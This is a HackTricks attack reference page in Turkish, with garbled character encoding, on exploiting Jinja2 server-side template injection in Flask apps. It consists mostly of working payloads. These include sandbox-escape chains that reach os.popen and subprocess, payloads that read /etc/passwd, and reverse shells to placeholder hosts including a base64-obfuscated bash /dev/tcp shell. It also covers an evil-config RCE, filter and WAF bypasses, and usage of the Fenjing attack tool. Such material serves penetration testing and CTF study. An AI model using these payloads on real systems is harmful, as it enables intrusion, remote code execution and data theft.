# Jinja2 SSTI

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## **Laboratuvar**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **Ã‡eÅŸitli**

### **Hata AyÄ±klama Ä°fadesi**

EÄŸer Hata AyÄ±klama Eklentisi etkinse, mevcut baÄŸlamÄ± ve mevcut filtreleri ve testleri dÃ¶kmek iÃ§in bir `debug` etiketi kullanÄ±labilir. Bu, bir hata ayÄ±klayÄ±cÄ± kurmadan ÅŸablonda kullanÄ±labilecekleri gÃ¶rmek iÃ§in faydalÄ±dÄ±r.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}






</pre>
```
### **TÃ¼m yapÄ±landÄ±rma deÄŸiÅŸkenlerini dÃ¶k**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinja Injection**

Ã–ncelikle, bir Jinja enjeksiyonunda **sandbox'tan kaÃ§manÄ±n bir yolunu bulmanÄ±z** ve normal python yÃ¼rÃ¼tme akÄ±ÅŸÄ±na eriÅŸimi geri kazanmanÄ±z gerekiyor. Bunu yapmak iÃ§in, **sandbox'tan eriÅŸilebilir ancak** **sandbox dÄ±ÅŸÄ± ortamdan gelen nesneleri** **istismar etmeniz** gerekiyor.

### Global Nesnelere EriÅŸim

Ã–rneÄŸin, `render_template("hello.html", username=username, email=email)` kodunda username ve email nesneleri **sandbox dÄ±ÅŸÄ± python ortamÄ±ndan gelir** ve **sandboxlÄ± ortamda eriÅŸilebilir** olacaktÄ±r.\
AyrÄ±ca, **sandboxlÄ± ortamdan her zaman eriÅŸilebilir** olacak baÅŸka nesneler de vardÄ±r, bunlar:
```
[]
''
()
dict
config
request
```
### Recovering \<class 'object'>

Sonra, bu nesnelerden **`<class 'object'>`** sÄ±nÄ±fÄ±na ulaÅŸmamÄ±z gerekiyor, bÃ¶ylece tanÄ±mlÄ± **sÄ±nÄ±flarÄ±** **recover** etmeye Ã§alÄ±ÅŸabiliriz. Bunun nedeni, bu nesneden **`__subclasses__`** metodunu Ã§aÄŸÄ±rarak **sandbox dÄ±ÅŸÄ±ndaki** python ortamÄ±ndaki tÃ¼m sÄ±nÄ±flara eriÅŸebilmemizdir.

Bu **nesne sÄ±nÄ±fÄ±na** eriÅŸmek iÃ§in, Ã¶nce bir **sÄ±nÄ±f nesnesine** eriÅŸmeniz ve ardÄ±ndan ya **`__base__`**, **`__mro__()[-1]`** ya da `.`**`mro()[-1]`** ile eriÅŸmeniz gerekiyor. Ve sonra, bu **nesne sÄ±nÄ±fÄ±na** ulaÅŸtÄ±ktan sonra **`__subclasses__()`** metodunu **Ã§aÄŸÄ±rÄ±yoruz**.

Bu Ã¶rneklere gÃ¶z atÄ±n:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}




# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE KaÃ§Ä±ÅŸÄ±

**KurtarÄ±ldÄ±ktan sonra** `<class 'object'>` ve `__subclasses__` Ã§aÄŸrÄ±ldÄ±ktan sonra, artÄ±k bu sÄ±nÄ±flarÄ± dosya okumak ve yazmak ve kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabiliriz.

`__subclasses__` Ã§aÄŸrÄ±sÄ±, **yÃ¼zlerce yeni iÅŸleve eriÅŸim** saÄŸladÄ±, **dosya sÄ±nÄ±fÄ±na** eriÅŸerek **dosya okumak/yazmak** veya **komut Ã§alÄ±ÅŸtÄ±rmaya izin veren** (Ã¶rneÄŸin `os`) herhangi bir sÄ±nÄ±fa eriÅŸerek mutlu olacaÄŸÄ±z.

**Uzak dosyayÄ± oku/yaz**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
Daha fazla **sÄ±nÄ±f** Ã¶ÄŸrenmek iÃ§in **kaÃ§Ä±ÅŸ** yapabileceÄŸiniz **ÅŸunlara gÃ¶z atabilirsiniz**:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Filtre atlamalarÄ±

#### YaygÄ±n atlamalar

Bu atlamalar, **bazÄ± karakterler** kullanmadan **nesnelerin** **niteliklerine** **eriÅŸmemizi** saÄŸlayacaktÄ±r.\
Daha Ã¶nceki Ã¶rneklerde bu atlamalardan bazÄ±larÄ±nÄ± zaten gÃ¶rdÃ¼k, ancak burada Ã¶zetleyelim:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**Daha fazla seÃ§enek iÃ§in buraya dÃ¶nÃ¼n, global bir nesneye eriÅŸim**](jinja2-ssti.md#accessing-global-objects)
* [**Daha fazla seÃ§enek iÃ§in buraya dÃ¶nÃ¼n, nesne sÄ±nÄ±fÄ±na eriÅŸim**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**Nesne sÄ±nÄ±fÄ± olmadan RCE elde etmek iÃ§in bunu okuyun**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML kodlamasÄ±ndan kaÃ§Ä±nma**

VarsayÄ±lan olarak Flask, gÃ¼venlik nedenleriyle bir ÅŸablondaki her ÅŸeyi HTML olarak kodlar:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** filtresi, JavaScript ve HTML'i sayfaya **HTML kodlamasÄ±** olmadan enjekte etmemize olanak tanÄ±r, ÅŸÃ¶yle:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**KÃ¶tÃ¼ bir yapÄ±landÄ±rma dosyasÄ± yazarak RCE.**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## BirkaÃ§ karakter olmadan

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`** olmadan
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}




```
## Jinja Enjeksiyonu **\<class 'object'>** Olmadan

[**KÃ¼resel nesneler**](jinja2-ssti.md#accessing-global-objects) kÄ±smÄ±ndan, **o sÄ±nÄ±fÄ± kullanmadan RCE'ye ulaÅŸmanÄ±n** baÅŸka bir yolu vardÄ±r.\
EÄŸer bu kÃ¼resel nesnelerden herhangi bir **fonksiyona** ulaÅŸmayÄ± baÅŸarÄ±rsanÄ±z, **`__globals__.__builtins__`**'e eriÅŸebileceksiniz ve buradan **RCE** Ã§ok **basit** olacaktÄ±r.

EriÅŸim saÄŸladÄ±ÄŸÄ±nÄ±z **`request`**, **`config`** ve diÄŸer **ilginÃ§ kÃ¼resel nesnelerden** fonksiyonlarÄ± **bulabilirsiniz**:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
Biraz iÅŸlev bulduktan sonra, yerleÅŸik iÅŸlevleri ÅŸu ÅŸekilde geri alabilirsiniz:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) CTF'ler iÃ§in Ã¶zel olarak tasarlanmÄ±ÅŸ bir araÃ§tÄ±r, ancak gerÃ§ek senaryolarda geÃ§ersiz parametreleri brute force yapmak iÃ§in de faydalÄ± olabilir. AraÃ§, filtreleri tespit etmek, bypass aramak iÃ§in kelimeleri ve sorgularÄ± yayar ve ayrÄ±ca etkileÅŸimli bir konsol saÄŸlar.
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [Burada kara listeye alÄ±nmÄ±ÅŸ karakterleri atlamak iÃ§in attr trick'i kontrol edin](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
